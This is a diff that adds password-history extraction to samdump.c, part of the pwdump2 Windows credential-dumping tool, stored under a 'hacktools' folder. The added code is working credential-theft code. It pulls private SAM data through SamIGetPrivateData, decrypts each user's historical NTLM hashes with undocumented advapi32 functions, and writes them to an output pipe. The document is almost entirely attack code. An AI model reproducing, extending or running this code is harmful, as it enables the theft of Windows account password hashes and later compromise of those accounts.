@@ -1,0 +1,156 @@
+--- /cygdrive/c/Downloads/pwdump2/samdump.c	2000-03-28 15:50:06.000000000 +0200
++++ /cygdrive/c/hacktools/rd/labb/pwdump2/samdump.c	2005-04-22 21:19:13.335332800 +0200
+@@ -21,6 +21,10 @@
+  * along with this program; if not, write to the Free Software
+  * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
+  *
++ * Changes
++ * -------
++ * 20050220	- Added functionality to extract history hashes <patrik@cqure.net>
++ *
+  ***************************************************************************/
+ 
+ #include <windows.h>
+@@ -34,6 +38,7 @@
+ 
+ 
+ static HINSTANCE hSamsrv;
++static HINSTANCE hAdvapi32;
+ 
+ typedef DWORD HUSER;
+ typedef DWORD HSAM;
+@@ -61,10 +66,14 @@
+ typedef HLOCAL   (WINAPI *SamIFree_SAMPR_USER_INFO_BUFFER_t) (PVOID, DWORD);
+ typedef HLOCAL   (WINAPI *SamIFree_SAMPR_ENUMERATION_BUUFER_t) (SAM_USER_ENUM*);
+ typedef NTSTATUS (WINAPI *SamrCloseHandle_t) (DWORD*);
++typedef NTSTATUS (WINAPI *SamIGetPrivateData_t) (HUSER, DWORD *, DWORD *, DWORD *, PVOID *);
++typedef NTSTATUS (WINAPI *SystemFunction025_t) (PVOID, DWORD*, BYTE[32] );
++typedef NTSTATUS (WINAPI *SystemFunction027_t) (PVOID, DWORD*, BYTE[32] );
+ 
+ 
+ #define SAM_USER_INFO_PASSWORD_OWFS 0x12
+-
++#define SAM_HISTORY_COUNT_OFFSET 0x3c
++#define SAM_HISTORY_NTLM_OFFSET 0x3c
+ 
+ //
+ //  Samsrv function pointers
+@@ -77,6 +86,9 @@
+ static SamIFree_SAMPR_USER_INFO_BUFFER_t pSamIFree_SAMPR_USER_INFO_BUFFER;
+ static SamIFree_SAMPR_ENUMERATION_BUUFER_t pSamIFree_SAMPR_ENUMERATION_BUFFER;
+ static SamrCloseHandle_t pSamrCloseHandle;
++static SamIGetPrivateData_t pSamIGetPrivateData;
++static SystemFunction025_t pSystemFunction025;
++static SystemFunction027_t pSystemFunction027;
+ 
+ //
+ // Load DLLs and GetProcAddresses
+@@ -85,7 +97,7 @@
+ LoadFunctions (void)
+ {
+     hSamsrv = LoadLibrary ("samsrv.dll");
+-
++	hAdvapi32 = LoadLibrary ("advapi32.dll");
+ 
+     pSamIConnect = (SamIConnect_t) GetProcAddress (hSamsrv, "SamIConnect");
+     pSamrOpenDomain = (SamrOpenDomain_t) GetProcAddress (hSamsrv, "SamrOpenDomain");
+@@ -95,6 +107,9 @@
+     pSamIFree_SAMPR_USER_INFO_BUFFER = (SamIFree_SAMPR_USER_INFO_BUFFER_t) GetProcAddress (hSamsrv, "SamIFree_SAMPR_USER_INFO_BUFFER");
+     pSamIFree_SAMPR_ENUMERATION_BUFFER = (SamIFree_SAMPR_ENUMERATION_BUUFER_t) GetProcAddress (hSamsrv, "SamIFree_SAMPR_ENUMERATION_BUFFER");
+     pSamrCloseHandle = (SamrCloseHandle_t) GetProcAddress (hSamsrv, "SamrCloseHandle");
++	pSamIGetPrivateData = (SamIGetPrivateData_t) GetProcAddress (hSamsrv, "SamIGetPrivateData");
++	pSystemFunction025 = (SystemFunction025_t) GetProcAddress( hAdvapi32, "SystemFunction025" );
++	pSystemFunction027 = (SystemFunction027_t) GetProcAddress( hAdvapi32, "SystemFunction027" );
+ 
+     return ((pSamIConnect != NULL)
+             && (pSamrOpenDomain != NULL)
+@@ -103,6 +118,9 @@
+             && (pSamrEnumerateUsersInDomain != NULL)
+             && (pSamIFree_SAMPR_USER_INFO_BUFFER != NULL)
+             && (pSamIFree_SAMPR_ENUMERATION_BUFFER != NULL)
++			&& (pSamIGetPrivateData != NULL)
++			&& (pSystemFunction025 != NULL )
++			&& (pSystemFunction027 != NULL )
+             && (pSamrCloseHandle != NULL));
+ }
+ 
+@@ -197,6 +215,9 @@
+     int theRc = 1;
+     HANDLE hPipe;
+ 
++	DWORD dw1, dw2;
++	DWORD dwCounter, dwOffset;
++
+     //
+     // Open the output pipe
+     //
+@@ -285,7 +306,10 @@
+                 CHAR  szUserName[256];
+                 wchar_t wBuff[256];
+                 DWORD dwSize;
+-                PVOID pUserInfo = 0;
++                PVOID pUserInfo = 0, pHistRec = 0;
++				BYTE hashData[64];
++				CHAR szHistName[270];
++				int j;
+ 
+                 //
+                 // Open the user (by Rid)
+@@ -332,11 +356,55 @@
+                 DumpInfo (hPipe, szUserName,
+                           pEnum->users[i].rid, pUserInfo);
+ 
++
++				pSamIFree_SAMPR_USER_INFO_BUFFER (pUserInfo, SAM_USER_INFO_PASSWORD_OWFS);
++
++				dw1 = 2;
++				dw2 = 0;
++				dwSize = 0;
++				pUserInfo = NULL;
++
++				rc = pSamIGetPrivateData( hUser, &dw1, &dw2, &dwSize, &pUserInfo );
++
++				if ( rc == 0 && dwSize > 0x3c ) {
++
++					pHistRec = pUserInfo;
++
++					dwCounter = (((BYTE *)pUserInfo)[SAM_HISTORY_COUNT_OFFSET]) / 16 ;
++					dwOffset  = (((BYTE *)pUserInfo)[SAM_HISTORY_NTLM_OFFSET]);
++
++					if ( ( dwCounter > 1 ) && ( dwSize > dwOffset + 0x64 ) ) {
++						
++						for ( j=dwCounter;j>1; j -- ) {
++
++							pHistRec = (BYTE *)pHistRec += 0x10;
++
++							if ( 0 != (rc = pSystemFunction025( (BYTE *)pHistRec+0x44, &pEnum->users[i].rid, hashData ) ) ) {
++								break;	
++							}
++
++							if ( 0 != (rc = pSystemFunction027( (BYTE *)pHistRec+0x44+dwOffset, &pEnum->users[i].rid, hashData+16 ) ) ) {
++								break;
++							}
++						    
++							_snprintf( szHistName, sizeof( szHistName ) - 1, "%s_history_%d", szUserName, dwCounter - j );
++							DumpInfo (hPipe, szHistName, pEnum->users[i].rid, hashData);
++														
++						}
++					}
++
++					if ( pUserInfo )
++						LocalFree( pUserInfo );
++
++					pUserInfo = 0;
++					
++				}
++
++
+                 //
+                 // Free stuff
+                 //
+-                pSamIFree_SAMPR_USER_INFO_BUFFER (pUserInfo,
+-                                                  SAM_USER_INFO_PASSWORD_OWFS);
++                
+                 pUserInfo = 0;
+                 pSamrCloseHandle (&hUser);
+                 hUser = 0;
